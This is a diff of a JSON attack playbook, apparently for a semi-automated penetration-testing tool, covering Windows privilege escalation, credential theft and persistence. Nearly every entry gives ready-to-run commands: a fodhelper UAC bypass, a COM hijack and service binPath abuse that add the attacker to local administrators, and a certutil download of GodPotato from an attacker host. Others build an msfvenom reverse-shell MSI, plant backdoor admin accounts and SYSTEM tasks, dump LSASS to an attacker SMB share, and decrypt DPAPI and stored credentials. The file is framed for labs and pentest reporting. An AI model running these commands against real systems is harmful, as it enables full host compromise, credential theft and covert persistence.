+      ],
+      "requires_any": [
+        "privesc.scheduled_task",
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 48,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM where a privileged scheduled task runs a file you can overwrite",
+      "does_not_prove": "anything unless the task target (or the task itself) is writable by you",
+      "report": {
+        "finding": "Writable scheduled-task privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks"
+      ],
+      "commands": [
+        {
+          "tool": "schtasks",
+          "run": "schtasks /query /v /fo LIST",
+          "note": "Find a task whose Run As User is SYSTEM and whose target path you can write."
+        },
+        {
+          "tool": "icacls",
+          "run": "icacls \"{{task_target}}\"",
+          "note": "Confirm Modify or Full control on the script or binary the task runs."
+        },
+        {
+          "tool": "cmd",
+          "run": "copy {{task_target}} {{task_target}}.bak && echo net localgroup administrators {{user}} /add > {{task_target}}",
+          "note": "Back up the original, then overwrite it with your payload."
+        },
+        {
+          "tool": "schtasks",
+          "run": "schtasks /run /tn \"{{task_name}}\"",
+          "note": "Run the task now, or wait for its schedule; it executes your payload as SYSTEM."
+        }
+      ]
+    },
+    {
+      "id": "windows-patch-exploit",
+      "title": "Windows Missing-Patch / Kernel LPE",
+      "phase": "escalate",
+      "hypothesis": "A Windows host missing a patch hands you SYSTEM through a public exploit, exactly as a vulnerable Linux kernel does. wesng (offline, against systeminfo) or Watson (on-box) diffs the installed hotfixes against the patch database and names the missing ones that carry a known local exploit. Confirm the exact build, match a public PoC to a named KB/CVE, read it, and run a precompiled binary where you can so a bad compile does not burn the session.",
+      "tool": "wesng",
+      "tools": [
+        "wesng",
+        "Watson",
+        "searchsploit"
+      ],
+      "requires_any": [
+        "privesc.patch_gap",
+        "exploit.candidate",
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 42,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "SYSTEM where a missing patch has a reliable public local exploit",
+      "does_not_prove": "anything until the exploit lands, and a bad PoC can crash the box",
+      "report": {
+        "finding": "Windows missing-patch local privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits"
+      ],
+      "commands": [
+        {
+          "tool": "cmd",
+          "run": "systeminfo > systeminfo.txt",
+          "note": "Capture the exact build and installed hotfixes for an offline diff."
+        },
+        {
+          "tool": "wesng",
+          "run": "wes.py systeminfo.txt --exploits-only",
+          "note": "Name the missing patches that carry a public local exploit (newest/most reliable first)."
+        },
+        {
+          "tool": "searchsploit",
+          "run": "searchsploit {{kb_or_cve}} windows local",
+          "note": "Find a known-good PoC for the flagged KB or CVE; prefer a precompiled binary."
+        },
+        {
+          "tool": "cmd",
+          "run": "{{exploit_binary}}",
+          "note": "Read the exploit first, then run it and confirm nt authority\\system."
+        }
+      ]
+    },
+    {
+      "id": "uac-bypass",
+      "title": "UAC Bypass to High Integrity",
+      "phase": "escalate",
+      "hypothesis": "A local administrator on Windows runs with a filtered (medium-integrity) token, so admin membership alone does not grant LSASS access or writes to protected paths until you elevate past UAC. An auto-elevating Microsoft binary that reads a registry key or file you control (fodhelper, computerdefaults) runs your command at high integrity with no consent prompt. You must already be in the local administrators group; this is what makes that membership usable.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "reg",
+        "fodhelper"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 55,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a high-integrity process where you are a filtered local admin",
+      "does_not_prove": "elevation from a standard (non-admin) user; this only un-filters an existing admin token",
+      "report": {
+        "finding": "UAC bypass to high integrity via auto-elevating binary",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://github.com/hfiref0x/UACME"
+      ],
+      "commands": [
+        {
+          "tool": "cmd",
+          "run": "whoami /groups | findstr /i \"Mandatory\"",
+          "note": "Medium Mandatory Level with admin membership means a filtered token a bypass can un-filter."
+        },
+        {
+          "tool": "reg",
+          "run": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd /c {{payload}}\" /f && reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /f",
+          "note": "Stage your command in the key fodhelper reads; the empty DelegateExecute forces the command handler."
+        },
+        {
+          "tool": "fodhelper",
+          "run": "fodhelper.exe",
+          "note": "The auto-elevating binary runs your staged command at high integrity with no prompt. computerdefaults.exe is the fallback."
+        },
+        {
+          "tool": "cmd",
+          "run": "whoami /groups | findstr /i \"High Mandatory\"",
+          "note": "High Mandatory Level confirms full admin; clean up the registry key afterward."
+        }
+      ]
+    },
+    {
+      "id": "com-hijack",
+      "title": "COM Hijack for Execution / Persistence",
+      "phase": "escalate",
+      "hypothesis": "A COM hijack points a CLSID a privileged process loads at a DLL you control, so when that process instantiates the object your code runs with its privileges. Unlike a file-path DLL hijack it is a registry redirect (an HKCU or writable HKLM InprocServer32 value), which you can always write in your own hive. Find candidates by watching Procmon for a CLSID lookup that returns NAME NOT FOUND from a writable key; it doubles as quiet persistence.",
+      "tool": "procmon",
+      "tools": [
+        "procmon",
+        "msfvenom",
+        "reg"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 48,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "execution as the privileged process that instantiates the hijacked CLSID",
+      "does_not_prove": "anything unless a privileged process actually resolves the CLSID from a key you can write",
+      "report": {
+        "finding": "COM hijack via writable CLSID InprocServer32",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/com-hijacking"
+      ],
+      "commands": [
+        {
+          "tool": "procmon",
+          "run": "Procmon filter: Operation is RegOpenKey, Result is NAME NOT FOUND, Path contains CLSID",
+          "note": "A privileged process resolving a CLSID from HKCU that does not exist is a hijack slot you can fill."
+        },
+        {
+          "tool": "msfvenom",
+          "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators {{user}} /add\" -f dll -o {{dll_name}}.dll",
+          "note": "Build a DLL whose COM entry point runs your payload; keep it fast so it does not hang the host process."
+        },
+        {
+          "tool": "reg",
+          "run": "reg add \"HKCU\\Software\\Classes\\CLSID\\{{clsid}}\\InprocServer32\" /ve /d \"C:\\Users\\{{user}}\\{{dll_name}}.dll\" /f",
+          "note": "Redirect the CLSID to your DLL; set ThreadingModel to Apartment for broad compatibility."
+        },
+        {
+          "tool": "cmd",
+          "run": "net localgroup administrators",
+          "note": "The next privileged instantiation runs your DLL; membership confirms it, and the key is a persistence foothold."
+        }
+      ]
+    },
+    {
+      "id": "windows-service-dacl-abuse",
+      "title": "Service DACL Abuse (SERVICE_CHANGE_CONFIG)",
+      "hypothesis": "A service whose security descriptor grants your user SERVICE_CHANGE_CONFIG can be reconfigured even when you cannot stop or start it. You point its binary path at your command, or change the account it runs as to LocalSystem, and the next time it starts (a reboot, an auto-start, or a trigger you are allowed to fire) it runs your payload with its privileges. The lever is the granular right in the SDDL, so this reaches services that a full SERVICE_ALL_ACCESS check would miss. Read the descriptor with accesschk or sc sdshow, confirm you hold the config right, then set binpath or obj and wait for the start you can reach.",
+      "tool": "accesschk",
+      "tools": [
+        "accesschk",
+        "sc"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "privesc.weak_service_permission",
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 54,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM or the service account where its DACL lets you reconfigure what it runs",
+      "does_not_prove": "anything unless you hold SERVICE_CHANGE_CONFIG and can reach a restart",
+      "report": {
+        "finding": "Service DACL abuse via SERVICE_CHANGE_CONFIG",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services"
+      ],
+      "commands": [
+        {
+          "tool": "accesschk",
+          "run": "accesschk.exe /accepteula -uwcqv {{user}} {{service}}",
+          "note": "Look for SERVICE_CHANGE_CONFIG (RCCE / WPWO in the SDDL) even without SERVICE_START or _STOP."
+        },
+        {
+          "tool": "sc",
+          "run": "sc qc {{service}}",
+          "note": "Note the current BINARY_PATH_NAME and SERVICE_START_NAME so you can restore them afterward."
+        },
+        {
+          "tool": "sc",
+          "run": "sc config {{service}} binPath= \"cmd /c net localgroup administrators {{user}} /add\"",
+          "note": "Reconfigure the binpath; if you only hold config and not start, changing obj= to LocalSystem for a service that auto-starts works the same on the next boot."
+        },
+        {
+          "tool": "sc",
+          "run": "sc start {{service}}",
+          "note": "Fire it if you are allowed; otherwise wait for its auto-start or a reboot, then confirm your new rights."
+        }
+      ]
+    },
+    {
+      "id": "windows-namedpipe-impersonation",
+      "title": "Named-Pipe Impersonation to SYSTEM",
+      "hypothesis": "A process that connects to a named pipe you created hands you its identity when you call ImpersonateNamedPipeClient. If you can coerce a more privileged client onto your pipe (a service you can point at a pipe path, a scheduled task, the print spooler, or a command run by a SYSTEM process), you impersonate its token, duplicate it, and spawn a process as that account. It is the primitive the Potato family automates, and it works even without SeImpersonate when the client itself connects back to you. Stand up the pipe server, trigger the privileged connection, then duplicate the captured token into a SYSTEM shell.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "msfvenom"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a token of the privileged client that connected to your pipe, duplicated into a SYSTEM process",
+      "does_not_prove": "anything unless a more privileged process actually connects to the pipe you control",
+      "report": {
+        "finding": "Named-pipe impersonation to SYSTEM",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation"
+      ],
+      "commands": [
+        {
+          "tool": "cmd",
+          "run": "whoami /priv",
+          "note": "SeImpersonate shortcuts this, but a client that connects to your pipe gives you its token even without it."
+        },
+        {
+          "tool": "cmd",
+          "run": "echo pipe-server listening on \\\\.\\pipe\\{{pipe_name}}",
+          "note": "Create the pipe server (a PrintSpoofer / GodPotato-style helper, or your own) and wait for a connection."
+        },
+        {
+          "tool": "cmd",
+          "run": "sc config {{service}} binPath= \"cmd /c echo x > \\\\.\\pipe\\{{pipe_name}}\" && sc start {{service}}",
+          "note": "Coerce a privileged client onto the pipe: a service you can reconfigure, a scheduled task, or the spooler all work."
+        },
+        {
+          "tool": "cmd",
+          "run": "whoami",
+          "note": "After ImpersonateNamedPipeClient and DuplicateTokenEx you run as the client; a SYSTEM result confirms it, then capture proof."
+        }
+      ]
     }
-   ]
-  },
-  {
-   "id": "seimpersonate",
-   "title": "SeImpersonatePrivilege (Potato Family)",
-   "hypothesis": "Service identities such as IIS or MSSQL nearly always carry SeImpersonatePrivilege, which allows them to grab a SYSTEM authentication and impersonate it — that is the whole potato lineage (GodPotato on current Windows, PrintSpoofer, JuicyPotato on legacy builds). Verify the preconditions before you begin: SeImpersonate is present, the .NET version is high enough, the target is x64, and you have a writable directory to stage from.",
-   "tool": "godpotato",
-   "tools": [
-    "godpotato"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.windows_privilege"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.system"
-   ],
-   "priority": 80,
-   "proves": "obtains SYSTEM access",
-   "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
-   "report": {
-    "finding": "SeImpersonatePrivilege Abuse (Potato)",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://github.com/BeichenDream/GodPotato",
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "whoami /priv | findstr /i impersonate",
-     "note": "Make sure SeImpersonatePrivilege is actually present before doing anything else."
-    },
-    {
-     "tool": "sh",
-     "run": "certutil -urlcache -f http://{{lhost}}:8000/GodPotato-NET4.exe gp.exe",
-     "note": "Drop the binary you picked (served from your machine). GodPotato handles Win10/11 and Server 2012 and up; reach for JuicyPotato on older targets."
-    },
-    {
-     "tool": "sh",
-     "run": "gp.exe -cmd \"cmd /c whoami > C:\\Windows\\Temp\\proof.txt\"",
-     "note": "Demonstrate SYSTEM with a harmless write first, read the file back to confirm, and only then fire your actual payload/reverse command."
-    }
-   ]
-  },
-  {
-   "id": "unquoted-service-path",
-   "title": "Unquoted Service Path",
-   "hypothesis": "When a service's binary path contains spaces and is not quoted (C:\\Program Files\\My App\\svc.exe), Windows attempts C:\\Program.exe, then C:\\Program Files\\My.exe, and so on in sequence. If you can write to any folder along that sequence, place an executable with the matching name and either restart the service or wait for the next reboot.",
-   "tool": "wmic",
-   "tools": [
-    "wmic",
-    "icacls"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.unquoted_service_path"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.system"
-   ],
-   "priority": 76,
-   "proves": "obtains SYSTEM access",
-   "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
-   "report": {
-    "finding": "Unquoted Service Path",
-    "severity": "high"
-   },
-   "refs": [
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v '\"'",
-     "note": "List auto-start services whose paths are unquoted and live outside C:\\Windows."
-    },
-    {
-     "tool": "sh",
-     "run": "icacls \"C:\\Program Files\\My App\"",
-     "note": "Confirm you actually have write access to the vulnerable folder before staging anything into it."
-    }
-   ]
-  },
-  {
-   "id": "weak-service-permissions",
-   "title": "Weak Service Permissions / Binary Replacement",
-   "hypothesis": "Being able to alter a service's configuration (SERVICE_CHANGE_CONFIG) or overwrite the executable it launches means you decide what runs as SYSTEM the next time it starts. accesschk locates these; from there, redirect binpath to your own command or swap out the binary.",
-   "tool": "accesschk",
-   "tools": [
-    "accesschk",
-    "sc"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.weak_service_permission"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.system"
-   ],
-   "priority": 76,
-   "proves": "obtains SYSTEM access",
-   "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
-   "report": {
-    "finding": "Weak Service Permissions",
-    "severity": "high"
-   },
-   "refs": [
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "accesschk",
-     "run": "accesschk.exe -uwcqv {{user}} * /accepteula",
-     "note": "The services your account is allowed to reconfigure."
-    },
-    {
-     "tool": "sh",
-     "run": "sc config {{service}} binpath= \"net localgroup administrators {{user}} /add\"",
-     "note": "Aim the service at a harmless but conclusive command, then sc stop/start it (or wait for a reboot if you cannot stop it)."
-    },
-    {
-     "tool": "sh",
-     "run": "icacls \"C:\\path\\to\\service.exe\"",
-     "note": "Alternatively, if the executable itself is writable, keep a backup and overwrite it with your payload."
-    }
-   ]
-  },
-  {
-   "id": "alwaysinstallelevated",
-   "title": "AlwaysInstallElevated",
-   "hypothesis": "When AlwaysInstallElevated is set to 1 in both HKLM and HKCU, every MSI you launch installs with SYSTEM rights. Build an MSI that creates an admin account or executes a command, run it, and you are done.",
-   "tool": "msfvenom",
-   "tools": [
-    "msfvenom",
-    "msiexec"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.always_install_elevated"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.system"
-   ],
-   "priority": 78,
-   "proves": "obtains SYSTEM access",
-   "does_not_prove": "SYSTEM is proven only by the command output itself; holding a privilege or spotting a service lead is not SYSTEM on its own",
-   "report": {
-    "finding": "AlwaysInstallElevated Enabled",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
-     "note": "Both keys have to read 1. Either one on its own gets you nowhere."
-    },
-    {
-     "tool": "msfvenom",
-     "run": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o setup.msi",
-     "note": "Build it on your own machine (the mentor can assemble this for you), upload it, then run: msiexec /i setup.msi /quiet"
-    }
-   ]
-  },
-  {
-   "id": "dpapi-secrets",
-   "title": "DPAPI Credential Decryption",
-   "hypothesis": "Saved credentials on Windows (RDP, scheduled tasks, browsers) are encrypted under DPAPI masterkeys, and those masterkeys are in turn protected by the user's password hash. Wherever you already have the user's password (or SYSTEM), the whole credential store can be decrypted — a dependable route to lateral credentials across the 0xdf corpus.",
-   "tool": "impacket-dpapi",
-   "tools": [
-    "impacket-dpapi",
-    "mimikatz"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [
-    "foothold.windows"
-   ],
-   "requires_any": [
-    "credential.available",
-    "access.system"
-   ],
-   "produces": [
-    "credential.plaintext",
-    "credential.candidate"
-   ],
-   "priority": 66,
-   "proves": "recovers a plaintext password and candidate credentials",
-   "does_not_prove": "produces credential material only — it is not access until it successfully authenticates against a service",
-   "report": {
-    "finding": "Stored Credentials Recovered via DPAPI",
-    "severity": "high"
-   },
-   "refs": [
-    "https://www.thehacker.recipes/ad/movement/dpapi",
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "dir /a %APPDATA%\\Microsoft\\Credentials && dir /a %APPDATA%\\Microsoft\\Protect",
-     "note": "Locate the credential blobs and the GUIDs of their masterkeys. Every blob records the masterkey it needs inside its own contents."
-    },
-    {
-     "tool": "impacket-dpapi",
-     "run": "impacket-dpapi masterkey -file <masterkey-file> -sid <user-sid> -password '{{password}}'",
-     "note": "Unwrap the masterkey with the user's password. The on-box counterpart is mimikatz dpapi::masterkey."
-    },
-    {
-     "tool": "impacket-dpapi",
-     "run": "impacket-dpapi credential -file <credential-blob> -key <unwrapped-masterkey-hex>",
-     "note": "Decrypt the blob using the unwrapped key. RDP credentials, VPN credentials, and service passwords all turn up here."
-    },
-    {
-     "tool": "mimikatz",
-     "run": "mimikatz # dpapi::cred /in:C:\\Users\\{{user}}\\AppData\\Roaming\\Microsoft\\Credentials\\<blob>",
-     "note": "The on-box option for when you are executing as that user or as SYSTEM."
-    }
-   ]
-  },
-  {
-   "id": "stored-credentials",
-   "title": "Stored Credential Hunting (Windows)",
-   "hypothesis": "Windows tends to stockpile credentials: Credential Manager (cmdkey), autologon registry entries, unattend/sysprep answer files, saved RDP files, browser vaults, and remote-connection tools (mRemoteNG configs whose passwords are recoverable) all leak reusable secrets. On lab machines this pass is quick, easily scripted, and pays off again and again.",
-   "tool": "sh",
-   "tools": [
-    "sh"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "foothold.windows"
-   ],
-   "produces": [
-    "credential.candidate",
-    "credential.plaintext",
-    "privesc.stored_credentials"
-   ],
-   "priority": 82,
-   "proves": "surfaces candidate credentials, a plaintext password, and a stored Windows credential lead",
-   "does_not_prove": "yields a local privilege-escalation lead only — it is not admin/root/SYSTEM until you prove that separately",
-   "report": {
-    "finding": "Stored Credentials in Cleartext/Recoverable Form",
-    "severity": "high"
-   },
-   "refs": [
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "cmdkey /list",
-     "note": "Saved credentials. If one is present: runas /savecred /user:{{user}} cmd.exe lets you use it without ever knowing the password."
-    },
-    {
-     "tool": "sh",
-     "run": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
-     "note": "Autologon: DefaultUserName / DefaultPassword sitting in cleartext."
-    },
-    {
-     "tool": "sh",
-     "run": "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul",
-     "note": "Imaging answer files — they carry local admin passwords in cleartext. Check C:\\Windows\\Panther\\Unattend.xml as well."
-    },
-    {
-     "tool": "sh",
-     "run": "dir /s %APPDATA%\\..\\*mRemoteNG*confCons.xml 2>nul && dir %USERPROFILE%\\*.rdp",
-     "note": "mRemoteNG configs store passwords that are encrypted but recoverable via a static key; .rdp files reveal targets and usernames."
-    },
-    {
-     "tool": "sh",
-     "run": "dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul",
-     "note": "Browser vaults are DPAPI-protected — recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline."
-    },
-    {
-     "tool": "sh",
-     "run": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s",
-     "note": "PuTTY saved sessions store secrets in cleartext: a ProxyPassword/ProxyUsername pair, or a full plink command line with -pw '<pass>' <user>@<host>. obol extracts the credential straight from this output."
-    },
-    {
-     "tool": "sh",
-     "run": "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" /s 2>nul",
-     "note": "WinSCP stores session passwords obfuscated (not cleartext) — flag them, then recover with a WinSCP password decoder / winscppasswd."
-    }
-   ]
-  },
-  {
-   "id": "windows-old-hives",
-   "title": "windows.old / Registry-Hive Secret Dump",
-   "hypothesis": "A leftover C:\\windows.old (from an in-place upgrade) or a saved SAM/SYSTEM/SECURITY hive holds old local-account hashes — often a still-valid Administrator hash you can crack or pass-the-hash. With a foothold, pull or save the hives and run secretsdump offline.",
-   "tool": "impacket-secretsdump",
-   "tools": ["impacket-secretsdump", "reg"],
-   "os": ["windows"],
-   "requires_all": [],
-   "requires_any": ["foothold.windows", "access.shell", "access.system"],
-   "produces": ["credential.candidate", "hash.ntlm", "loot.files"],
-   "priority": 82,
-   "autonomy": "approve",
-   "proves": "local-account NTLM hashes recovered from windows.old or saved registry hives (SAM + SYSTEM [+ SECURITY])",
-   "does_not_prove": "a validated login — a recovered hash must still be cracked or passed against a live service to prove access",
-   "report": {"finding": "Credential Exposure via windows.old / Backup Registry Hives", "severity": "high"},
-   "refs": ["https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg"],
-   "commands": [
-    {"tool": "sh", "run": "dir /a C:\\ | findstr /i windows.old & dir C:\\windows.old\\Windows\\System32\\config\\", "note": "Look for a leftover windows.old tree — the old SAM/SYSTEM/SECURITY live under ...\\Windows\\System32\\config."},
-    {"tool": "reg", "run": "reg save HKLM\\SAM %TEMP%\\SAM.hive & reg save HKLM\\SYSTEM %TEMP%\\SYSTEM.hive & reg save HKLM\\SECURITY %TEMP%\\SECURITY.hive", "note": "Or, once you hold the box (local admin/SYSTEM), save the LIVE hives, then exfil the three files to Kali."},
-    {"tool": "impacket-secretsdump", "run": "impacket-secretsdump -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL", "note": "Parse offline on Kali. Crack or pass-the-hash the recovered Administrator hash, then paste the result on Evidence."},
-    {"tool": "impacket-secretsdump", "run": "impacket-secretsdump {{domain}}/{{user}}:'{{password}}'@{{target}}", "note": "Or dump remotely when you already hold admin creds on the box."}
-   ]
-  },
-  {
-   "id": "wesng-patch-gaps",
-   "title": "Missing-Patch Exploit Suggestions (wesng)",
-   "hypothesis": "Aging Windows hosts (particularly HTB-era 2008/2012/7) are frequently escalated through a missing patch rather than a misconfiguration. Feeding systeminfo output to Windows Exploit Suggester / wesng maps absent hotfixes to public exploits (MS16-032, MS15-051, Chimichurri, and so on). This is the arctic/grandpa workflow: enumerate the patches, match them, then exploit.",
-   "tool": "wesng",
-   "tools": [
-    "wesng"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "foothold.windows"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "exploit.candidate",
-    "privesc.patch_gap"
-   ],
-   "priority": 70,
-   "proves": "surfaces a candidate exploit and a missing-patch privilege-escalation lead",
-   "does_not_prove": "yields a local privilege-escalation lead only — it is not admin/root/SYSTEM until you prove that separately",
-   "report": {
-    "finding": "Missing Security Patches with Public Exploits",
-    "severity": "high"
-   },
-   "refs": [
-    "https://github.com/bitsadmin/wesng"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "systeminfo",
-     "note": "Run this on the target. Capture the complete output on your side: systeminfo > sysinfo.txt, then bring it back."
-    },
-    {
-     "tool": "sh",
-     "run": "wesng sysinfo.txt",
-     "note": "Run on your own machine (pip install wesng; it refreshes its database automatically). Produces a ranked list of missing KBs tied to public exploits."
-    },
-    {
-     "tool": "sh",
-     "run": "python3 windows-exploit-suggester.py --update && python3 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt",
-     "note": "The classic alternative (corpus arctic). Older, but well proven on 2008-era hosts."
-    }
-   ]
-  },
-  {
-   "id": "windows-persistence",
-   "title": "Windows Persistence (Post-Admin)",
-   "hypothesis": "Once you hold admin/SYSTEM, leave yourself a route back in: a local admin account you own, a scheduled task, or a Run key. Labs seldom need it, but longer engagements do — and it makes for a report-worthy note about detection gaps. Record and remove everything you deploy.",
-   "tool": "sh",
-   "tools": [
-    "sh"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "persistence.windows"
-   ],
-   "priority": 50,
-   "proves": "a re-entry mechanism was planted on the host — an owned account, scheduled task, or autorun key that survives a reboot",
-   "does_not_prove": "represents persistence setup context — record it and clean it up; it is not a new privilege level",
-   "report": {
-    "finding": "Persistence Mechanism Planted",
-    "severity": "informational"
-   },
-   "refs": [
-    "https://lolbas-project.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add",
-     "note": "The textbook local-admin backdoor. Stands out in any user audit — acceptable in labs, noisy in real environments."
-    },
-    {
-     "tool": "sh",
-     "run": "schtasks /create /tn \"WindowsUpdateCheck\" /sc daily /st 09:00 /tr \"C:\\Windows\\Temp\\update.exe\" /ru SYSTEM",
-     "note": "A scheduled task that runs your binary as SYSTEM every day."
-    },
-    {
-     "tool": "sh",
-     "run": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\update.exe\"",
-     "note": "A Run key — it triggers at the next logon."
-    }
-   ]
-  },
-  {
-   "id": "lsass-dump-onbox",
-   "title": "On-Box LSASS Memory Dump",
-   "hypothesis": "LSASS keeps the credentials of every logged-on user in memory. With admin/SYSTEM you can dump its process using the built-in comsvcs.dll (nothing to upload) or procdump, ship the .dmp off the box, and parse it offline with pypykatz — recovering plaintext passwords, NT hashes, and Kerberos tickets for anyone signed in. This pairs well with remote secrets dumping for the times you only have a shell on the machine.",
-   "tool": "cmd",
-   "tools": [
-    "cmd",
-    "procdump",
-    "pypykatz",
-    "impacket-smbserver"
-   ],
-   "os": [
-    "windows"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "credential.plaintext",
-    "hash.ntlm",
-    "kerberos.tickets"
-   ],
-   "priority": 66,
-   "proves": "recovers a plaintext password, NTLM hashes, and Kerberos tickets",
-   "does_not_prove": "produces credential material only — it is not access until it successfully authenticates against a service",
-   "report": {
-    "finding": "Credentials Extractable from LSASS Memory",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/",
-    "https://github.com/skelsec/pypykatz"
-   ],
-   "commands": [
-    {
-     "tool": "powershell",
-     "run": "Get-Process lsass",
-     "note": "Grab the LSASS PID first — comsvcs MiniDump requires it. tasklist /svc will also show it."
-    },
-    {
-     "tool": "cmd",
-     "run": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
-     "note": "A built-in LOLBin dump — swap 672 for the real PID and run it from an elevated prompt. Nothing gets uploaded; comsvcs.dll MiniDump is a documented Windows capability. (Defender flags this exact string on current builds; fall back to procdump then.)"
-    },
-    {
-     "tool": "sh",
-     "run": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
-     "note": "The Sysinternals route for when comsvcs is blocked. Serve procdump from your own machine (see file-transfer)."
-    },
-    {
-     "tool": "impacket-smbserver",
-     "run": "impacket-smbserver -smb2support CompData .",
-     "note": "On YOUR machine: catch the dump. From the target: move C:\\Windows\\Temp\\lsass.dmp \\\\{{lhost}}\\CompData"
-    },
-    {
-     "tool": "pypykatz",
-     "run": "pypykatz lsa minidump lsass.dmp",
-     "note": "Parse it offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every captured session — no spraying needed, just reuse. The Windows-side equivalent is mimikatz sekurlsa::minidump followed by sekurlsa::logonpasswords."
-    }
-   ]
-  }
- ]
+  ]
 }
